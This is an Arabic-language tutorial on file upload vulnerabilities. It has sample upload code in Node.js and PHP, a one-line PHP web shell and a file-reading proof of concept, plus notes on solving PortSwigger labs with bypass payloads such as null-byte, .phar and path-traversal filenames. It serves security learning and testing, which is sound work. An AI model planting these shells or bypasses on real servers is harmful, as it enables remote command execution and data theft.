#### «إنَّ الحمدَ للهِ ، نحمدُه ونستعينُه ونستهديه ونستغفِرُه ، ونعوذُ باللهِ من شرورِ أنفسنِا ومن سيِّئاتِ أعمالِنا ، من يهدِه اللهُ فلا مُضلَّ له ، ومن يُضلِلْ فلا هاديَ له ، وأشهدُ أن لا إلهَ إلَّا اللهُ وحدَه لا شريكَ له ، وأشهدُ أنَّ محمَّدًا عبدُه ورسولُه»
---
### أي هي ثغرة ال File Upload ؟

هي عملية تمكن المستخدمين من تحميل ملفات من أجهزتهم المحلية (مثل الصور، الفيديوهات، أو المستندات) إلى خادم ويب أو نظام معين. يتم استخدامه بشكل شائع في نماذج الويب مثل مواقع رفع الصور، المنتديات، أو تطبيقات الويب.
### خطوات عمل فانكشن رفع الملفات:

### 1. **الجزء الخاص بالواجهة الأمامية (Front-End):**

تحتاج إلى عنصر HTML يقوم بتمكين المستخدم من اختيار ملف، ويتم ذلك باستخدام العنصر `<input>` مع النوع `file`:

```html
<form action="/upload" method="POST" enctype="multipart/form-data">
  <label for="file">اختر ملف:</label>
  <input type="file" id="file" name="file" />
  <button type="submit">رفع الملف</button>
</form>
```

- ال **`enctype="multipart/form-data"`**: ضروري لضمان إرسال البيانات بالشكل الصحيح.
- ال **`name="file"`**: يحدد اسم الملف الذي سيتم التعامل معه على الخادم.

### 2. **الجزء الخاص بالواجهة الخلفية (Back-End):**

في الخادم، يتم استلام الملف ومعالجته. على سبيل المثال، باستخدام **Node.js** مع مكتبة `express` و`multer` لرفع الملفات:

```jsx
const express = require('express');
const multer = require('multer');
const app = express();

// إعداد التخزين
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/'); // مجلد حفظ الملفات
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + '-' + file.originalname); // اسم الملف
  }
});

const upload = multer({ storage });

app.post('/upload', upload.single('file'), (req, res) => {
  res.send('تم رفع الملف بنجاح!');
});

app.listen(3000, () => {
  console.log('الخادم يعمل على المنفذ 3000');
});
```

### 3. **توضيح الكود اللي فوق:**

- **`multer`**: مكتبة Node.js لمعالجة الملفات.
- **`diskStorage`**: يحدد أين وكيف يتم حفظ الملفات.
- **`upload.single('file')`**: يقبل ملفًا واحدًا مرفوعًا مع الحقل `file`.

### 4. **التحقق من الملف (Validation):**

للتحقق من الملفات المرفوعة، يمكن التحقق من:

- **النوع (Type):** السماح بتحميل أنواع معينة فقط مثل الصور (`image/jpeg`, `image/png`).
- **الحجم (Size):** رفض الملفات التي تتجاوز حجمًا معينًا.

```jsx
const upload = multer({
  storage,
  fileFilter: (req, file, cb) => {
    if (!file.mimetype.startsWith('image/')) {
      return cb(new Error('يُسمح فقط برفع الصور'));
    }
    cb(null, true);
  },
  limits: { fileSize: 5 * 1024 * 1024 } // الحد الأقصى 5 ميجابايت
});

```

### 5. **إدارة الملفات المرفوعة:**

- **التخزين المحلي (Local Storage):** تخزين الملفات في مجلدات على الخادم.
- **التخزين السحابي (Cloud Storage):** مثل Amazon S3 أو Google Cloud Storage لتحسين الأمان والوصول.

### مثال عملي:

إذا كنت تعمل على تطبيق بلغة PHP، يمكنك استخدام `$_FILES` لمعالجة الملفات:

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $uploadDir = 'uploads/';
    $uploadFile = $uploadDir . basename($_FILES['file']['name']);

    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        echo "تم رفع الملف بنجاح!";
    } else {
        echo "حدث خطأ أثناء رفع الملف.";
    }
}
?>
```

### مصادر تساعدك وانت بتعمل تيست:
[hacker tricks](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)
[payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

### أي هو الكود اللي هترفعه ك POC ؟

- لو انت عايز تفتح `file` انت عارفو يبقي هتعمل الكود ده

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

- لو عايز تخليه زي ال `command line` بيقبل منك أي `command` يبقي كدة

```php
<?php echo system($_GET['command']); ?>
```

ولما تيجي تستخدمو في الموقع هيبقي كدة
`GET /example/exploit.php?command=id HTTP/1.1`

### أزاي تعمل test عالثغرة دي؟

لما تيجي ترفع الصورة - الطبيعي يبقي فيه شوية حاجات ثابتة زي `file extention` and `content-type` and `file content` فأنت بتحاول علي قد ما تقدر تغير في دول الأول عشان تعرف الموقع شغال ازاي:

- لو ال file extention كدة `image.png` هنخليه كدة `image.php` وتشوف ال response
- لو ال content-type كدة `image/png` هنخليه كدة `application/x-php` وتشوف ال response
- وتحاول تغير المحتوي بتاع الصورة لأي كود php وليكن `echo 23`

### حل لابات بورت سويجر؟

- أول لاب - مكنش محمي أطلاقا وقدرت أرفع الشيل بكل سهولة - بمعني أصح (مفهوش فكرة)
- تاني لاب - الحاجه الوحيدة اللي كانت محمية (بس مش بشكل كويس) هي ال `content-type`
- تالت لاب - فاكرين ثغرة ال `Path Traversal` ” هي دي البطلة بتاعتنا في اللاب ده ” لأن الحماية الوحيدة اللي موجودة هي ان الصفحة اللي بيترفع فيها الشيل مش بيrender ال code ولكن بيتعامل معاه علي أنه `text file` فجربت عند اسم ال `file` أحط `/..` ونفعت فكان ده البايلود `file.php/..` وكنت عامل `encode` لل `/`
- رابع لاب - كان عامل `Black List` وحاطت فيها `extentions` مش عايزها تتحط ف من المستحيل انه يحط كل ال `extentions` ف بعد ما وقت لقيت `phar` جربتها ونفعت
- خامس لاب - هنا بقي كان عامل `white list` ودي كان حاطت انه مينفعش يترفع ملف غيره وامتداده `jpg or png` ومشش عامل حماية علي اي حاجه تاني ف عملت كدة `file.php%00.jpg` وده بأختصار بيحذف أي حاجه بعد ال `php`
- سادس لاب - هنا بيعمل `validation` علي ال `content` بتاع الصورة ف عشان نحل الموضوع ده جربنا اننا ن `inject` كود `php` في نص محتوي الصورة والموضوع عدي بسلاسة ونعومة

### نصائح:

- تأكد من أمان عملية رفع الملفات (مثل التحقق من نوع الملف وحجمه).
- امنع تنفيذ الملفات المرفوعة إذا كانت على الخادم لتجنب الهجمات.
- استخدم أنظمة سحابية إذا كنت تتعامل مع ملفات كبيرة أو العديد من المستخدمين.